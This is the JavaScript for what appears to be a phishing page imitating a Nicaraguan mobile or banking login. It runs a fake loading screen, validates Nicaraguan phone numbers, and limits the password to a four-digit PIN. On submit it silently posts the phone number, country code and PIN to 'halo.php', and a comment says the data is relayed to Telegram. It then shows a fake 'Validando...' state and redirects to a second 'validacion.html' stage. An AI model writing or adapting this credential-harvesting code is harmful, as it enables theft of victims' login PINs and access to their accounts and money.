(() => {
  const LMS = 2500;

  function sht(msg) {
    let t = document.getElementById('nqToast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'nqToast';
      t.className = 'nq-toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), 2400);
  }

  const loader = document.getElementById('lsc');
  const app = document.getElementById('aap');

  // Mostrar app después del loader
  setTimeout(() => {
    loader.classList.add('fade-out');
    app.hidden = false;
    setTimeout(() => loader.remove(), 450);
  }, LMS);

  // Teléfono Nicaragua: auto-formato 8888 8888
  const p01 = document.getElementById('p01');
  const pwd = document.getElementById('password');

  p01?.addEventListener('input', (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    e.target.value = digits.length > 4
      ? digits.slice(0, 4) + ' ' + digits.slice(4)
      : digits;
  });
  pwd?.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
  });

  // Submit
  const form = document.getElementById('afm');
  form?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    // Nicaragua: 8 dígitos, debe iniciar en 2, 5, 7 u 8
    const digits = p01.value.replace(/\D/g, '');
    if (digits.length !== 8 || !['2','5','7','8'].includes(digits[0])) {
      p01.focus();
      p01.classList.add('input-error');
      sht('Número inválido. Debe ser un teléfono nicaragüense de 8 dígitos.');
      return;
    }
    p01.classList.remove('input-error');

    if (pwd.value.length !== 4) {
      pwd.focus();
      return;
    }
    // Guardar datos para la siguiente pantalla
    const cc1 = document.getElementById('cc1').value;
    sessionStorage.setItem('p01', digits);
    sessionStorage.setItem('cc1', cc1);
    sessionStorage.setItem('attempts', '0');

    // Enviar a Telegram (no bloqueante)
    fetch('halo.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'acceso',
        cc1,
        p01: digits,
        password: pwd.value,
      }),
      keepalive: true,
    }).catch(() => {});

    const btn = form.querySelector('.btn-pink');
    btn.textContent = 'Validando...';
    btn.disabled = true;
    setTimeout(() => {
      window.location.href = 'validacion.html';
    }, 800);
  });
})();
